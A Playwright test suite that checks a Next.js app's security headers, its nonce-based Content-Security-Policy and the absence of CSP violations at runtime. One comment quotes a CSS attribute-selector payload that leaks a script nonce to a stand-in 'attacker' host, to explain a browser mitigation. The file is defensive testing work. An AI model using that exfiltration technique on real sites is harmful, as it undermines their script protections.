import { expect, test } from '@playwright/test'

// The half of the security posture that tools/check-security-headers.mjs structurally
// CANNOT prove: that the headers reach a real browser over a real response, and that
// the CSP the app actually sends does not break the app.
//
// A correct next.config.ts behind a CDN that strips headers, a proxy whose matcher
// excludes the route you care about, or a nonce that never reaches Next's inline
// bootstrap all look identical to a static gate. The static gate reads intent; this
// reads the wire.
// SOURCE: docs/harness/gates-catalog.md (security-headers: the static/live split)

test('the static security headers reach a real response', async ({ page }) => {
  const response = await page.goto('/')
  expect(response).not.toBeNull()

  const headers = response?.headers() ?? {}
  expect(headers['x-content-type-options']).toBe('nosniff')
  expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin')
  expect(headers['x-frame-options']).toBe('DENY')
  expect(headers['cross-origin-opener-policy']).toBe('same-origin')
  expect(headers['strict-transport-security']).toContain('includeSubDomains')

  // Denied features are denied by an EMPTY allowlist, not by omission.
  const permissions = headers['permissions-policy'] ?? ''
  for (const feature of ['camera', 'microphone', 'geolocation', 'payment']) {
    expect(permissions, `permissions-policy must deny ${feature}`).toMatch(
      new RegExp(`${feature}=\\(\\)`),
    )
  }

  // x-powered-by names the framework and version to every scanner for zero benefit.
  expect(headers['x-powered-by']).toBeUndefined()
})

test('a document response carries a nonce CSP that Next can actually use', async ({ page }) => {
  const response = await page.goto('/')
  const csp = response?.headers()['content-security-policy'] ?? ''

  expect(csp, 'document responses must carry an enforcing CSP').not.toBe('')
  expect(csp).toContain("frame-ancestors 'none'")
  expect(csp).toContain("object-src 'none'")
  expect(csp).toContain("'strict-dynamic'")
  expect(csp).not.toContain("'unsafe-eval'")

  // The nonce must be a real per-response value, not the literal token.
  const nonce = /'nonce-([^']+)'/.exec(csp)?.[1]
  expect(nonce, 'script-src must carry a minted nonce').toBeTruthy()
  expect(nonce).not.toBe('undefined')
  expect((nonce ?? '').length).toBeGreaterThan(8)

  // And Next must have STAMPED that nonce onto the scripts it generates. This is the
  // assertion that catches the most common way a nonce CSP ships broken: the header is
  // perfect, the request-header propagation in proxy.ts is missing, and every script on
  // the page is blocked.
  //
  // READ VIA THE IDL PROPERTY (`el.nonce`), NEVER A CSS ATTRIBUTE SELECTOR. Browsers CLEAR
  // the `nonce` content attribute once the element is inserted — `getAttribute('nonce')`
  // returns '' and `script[nonce="..."]` matches nothing, on a perfectly working page. That
  // is a deliberate mitigation: without it, an injected stylesheet could exfiltrate the
  // nonce one character at a time with attribute selectors
  // (`script[nonce^="a"] { background: url(//attacker/a) }`). The value survives only on the
  // element's IDL attribute, which is same-origin script's to read.
  //
  // The first version of this spec used the selector and was therefore a test that could
  // ONLY fail — a worse defect than a vacuous one, because the fix people reach for is to
  // delete it.
  // SOURCE: https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes
  const stamped = await page.evaluate(
    (want) => [...document.querySelectorAll('script')].filter((el) => el.nonce === want).length,
    nonce ?? '',
  )
  expect(stamped, 'Next did not stamp the CSP nonce onto the scripts it emits').toBeGreaterThan(0)
})

test('the CSP does not block the page it protects', async ({ page }) => {
  // A policy that blanks the app is not a stricter policy, it is an outage. Collecting
  // the browser's own violation events is the only way to know before a user does.
  const violations: string[] = []
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (event) => {
      const e = event as SecurityPolicyViolationEvent
      ;(window as unknown as { __cspViolations?: string[] }).__cspViolations ??= []
      ;(window as unknown as { __cspViolations: string[] }).__cspViolations.push(
        `${e.violatedDirective} blocked ${e.blockedURI}`,
      )
    })
  })

  await page.goto('/')
  await page.waitForLoadState('networkidle')
  violations.push(
    ...(await page.evaluate(
      () => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? [],
    )),
  )

  expect(
    violations,
    `the app's own CSP blocked its own resources:\n${violations.join('\n')}`,
  ).toEqual([])

  // Hydration is the thing a broken script-src kills. If React never mounted, the page
  // is a static shell and every interactive assertion elsewhere in the suite is passing
  // against something that does not work.
  await expect(page.locator('body')).toBeVisible()
})
